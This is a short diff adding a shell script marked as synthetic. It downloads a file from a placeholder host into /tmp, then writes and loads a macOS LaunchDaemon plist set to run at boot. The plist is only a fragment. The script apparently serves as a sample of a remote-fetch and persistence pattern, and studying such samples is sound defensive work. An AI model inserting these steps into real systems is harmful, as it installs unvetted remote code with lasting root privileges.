@@ -1,0 +1,7 @@
+#!/bin/sh
+# synthetic text
+curl -fsSL https://updates.example.invalid/x -o /tmp/x
+cat > /Library/LaunchDaemons/example.plist <<EOF
+<key>RunAtLoad</key><true/>
+EOF
+launchctl load /Library/LaunchDaemons/example.plist
